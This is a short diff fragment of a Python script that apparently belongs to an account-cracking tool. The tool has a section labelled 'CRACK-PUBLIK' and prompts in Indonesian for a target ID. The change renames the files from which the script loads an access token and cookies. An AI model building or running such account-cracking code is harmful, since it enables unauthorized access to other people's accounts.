@@ -308,8 +308,8 @@ def result():
 #-------------------[ CRACK-PUBLIK ]----------------#
 def nge_krek1():
 		with requests.Session() as ses:
-		token = open('.cyxieontoken.txt','r').read()
-		cok = open('.cyxieoncokies.txt','r').read()		
+		token = open('.token.txt','r').read()
+		cok = open('.cok.txt','r').read()		
 		a = input('└──[ masukan id target: ')
 		try:
 			params = {
